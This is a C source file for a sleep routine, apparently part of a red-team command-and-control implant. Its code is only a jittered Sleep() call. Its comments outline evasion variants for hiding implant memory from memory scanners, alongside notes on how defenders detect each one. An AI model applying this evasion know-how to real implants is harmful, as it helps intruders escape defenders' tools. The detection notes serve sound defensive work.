// sleep_mask.c — sleep obfuscation stub.
//
// Provides sleep_mask() and can_mask(), the two weak symbols consumed by loop.c.
//
// This stub implements the simplest possible version: a plain Sleep() call with
// no masking. The actual sleep obfuscation variants (timer-queue APC, fiber,
// heap encryption) are separate object files that can be linked in instead.
//
// Detection implications of each variant:
//
//   PLAIN (this file):
//     - Agent memory is RX + readable during sleep.
//     - Hunt-Sleeping-Beacons, Moneta, PE-sieve will find it immediately.
//
//   TIMER-QUEUE APC (sleep_mask_timer.c):
//     - RX→RW→encrypt→sleep→decrypt→RX sequence.
//     - ETW-TI FluctuationMonitor sees the RW↔RX flip.
//     - Sigma: detections/sigma/sleep_mask_rw_flip.yml
//
//   FIBER (sleep_mask_fiber.c):
//     - Converts thread to fiber, switches context, no kernel-visible sleep.
//     - Unusual fiber SwitchToFiber call sequence visible in ETW-TI.
//
//   HEAP-ENCRYPT (additive to any above):
//     - Walks HeapWalk and XORs heap allocations before sleep.
//     - Defeats Moneta heap scan but HeapWalk calls are auditable.

#include <windows.h>
#include "../../include/lattice_agent.h"

static volatile int g_autonomous_bof_running = 0;

// can_mask: returns non-zero if safe to enter sleep_mask.
// An AUTONOMOUS BOF sets g_autonomous_bof_running = 1 on start and
// clears it on completion. This is the predicate checked by loop.c.
int can_mask(void) {
    return g_autonomous_bof_running == 0;
}

// sleep_mask: plain sleep, no masking (baseline stub).
void sleep_mask(uint32_t ms, uint32_t jitter_pct) {
    // Apply jitter: randomize ±jitter_pct% around ms.
    if (jitter_pct > 0 && jitter_pct <= 100) {
        DWORD rng;
        // CRT-free RNG via RDTSC seed + LCG.
        // TODO: replace with BCryptGenRandom for FIPS compliance.
        rng = (DWORD)__rdtsc();
        DWORD range = (ms * jitter_pct) / 100;
        DWORD offset = rng % (range * 2);
        ms = (ms > range) ? (ms - range + offset) : ms;
    }

    // TODO: replace Sleep with a timer-queue APC or fiber variant that
    // masks the agent image and heap during the wait interval.
    Sleep(ms);
}
